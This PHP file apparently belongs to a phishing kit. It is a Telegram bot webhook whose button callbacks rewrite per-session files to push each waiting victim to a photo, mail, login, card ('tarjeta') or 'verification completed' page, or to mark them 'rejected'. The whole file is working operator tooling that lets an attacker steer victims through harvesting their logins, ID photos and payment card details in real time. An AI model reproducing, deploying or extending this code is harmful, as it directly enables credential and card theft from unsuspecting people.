<?php
// Telegram exige respuesta 200 rápida; responder siempre OK
http_response_code(200);
header('Content-Type: application/json');

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update) {
    echo json_encode(['ok' => true]);
    exit;
}

include __DIR__ . '/data.php';

if (isset($update['callback_query'])) {
    $callbackData = $update['callback_query']['data'];
    $callbackId = $update['callback_query']['id'];
    
    // Check if it's a photo request
    if (strpos($callbackData, 'photo_') === 0) {
        $sessionId = str_replace('photo_', '', $callbackData);
        
        // Update session file to redirect
        $sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
        if (file_exists($sessionFile)) {
            file_put_contents($sessionFile, 'redirect');
            
            // Answer callback to remove loading state
            $answerUrl = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
            $answerData = [
                'callback_query_id' => $callbackId,
                'text' => '✅ Foto solicitada'
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $answerUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $answerData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }
    
    // Check if it's an incorrect request
    if (strpos($callbackData, 'incorrect_') === 0) {
        $sessionId = str_replace('incorrect_', '', $callbackData);
        
        // Update session file to redirect to index with error
        $sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
        if (file_exists($sessionFile)) {
            file_put_contents($sessionFile, 'incorrect');
            
            // Answer callback to remove loading state
            $answerUrl = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
            $answerData = [
                'callback_query_id' => $callbackId,
                'text' => '❌ Usuario rechazado'
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $answerUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $answerData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }
    
    // Check if it's a mail request
    if (strpos($callbackData, 'mail_') === 0) {
        $sessionId = str_replace('mail_', '', $callbackData);
        
        // Update session file to redirect to mail
        $sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
        if (file_exists($sessionFile)) {
            file_put_contents($sessionFile, 'mail');
            
            // Answer callback to remove loading state
            $answerUrl = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
            $answerData = [
                'callback_query_id' => $callbackId,
                'text' => '📩 Enviado a Mail'
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $answerUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $answerData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }
    
    // Check if it's a login request
    if (strpos($callbackData, 'login_') === 0) {
        $sessionId = str_replace('login_', '', $callbackData);
        
        // Update session file to redirect to login
        $sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
        if (file_exists($sessionFile)) {
            file_put_contents($sessionFile, 'login');
            
            // Answer callback to remove loading state
            $answerUrl = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
            $answerData = [
                'callback_query_id' => $callbackId,
                'text' => '🔑 Enviado a Login'
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $answerUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $answerData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }
    
    // Check if it's a tarjeta request
    if (strpos($callbackData, 'tarjeta_') === 0) {
        $sessionId = str_replace('tarjeta_', '', $callbackData);
        
        // Update session file to redirect to tarjeta
        $sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
        if (file_exists($sessionFile)) {
            file_put_contents($sessionFile, 'tarjeta');
            
            // Answer callback to remove loading state
            $answerUrl = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
            $answerData = [
                'callback_query_id' => $callbackId,
                'text' => '💳 Enviado a Tarjeta'
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $answerUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $answerData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }
    
    // Check if it's a listo request
    if (strpos($callbackData, 'listo_') === 0) {
        $sessionId = str_replace('listo_', '', $callbackData);
        
        // Update session file to redirect to listo page
        $sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
        if (file_exists($sessionFile)) {
            file_put_contents($sessionFile, 'listo');
            
            // Answer callback to remove loading state
            $answerUrl = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
            $answerData = [
                'callback_query_id' => $callbackId,
                'text' => '✅ Verificación completada'
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $answerUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $answerData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }
}

echo json_encode(['ok' => true]);
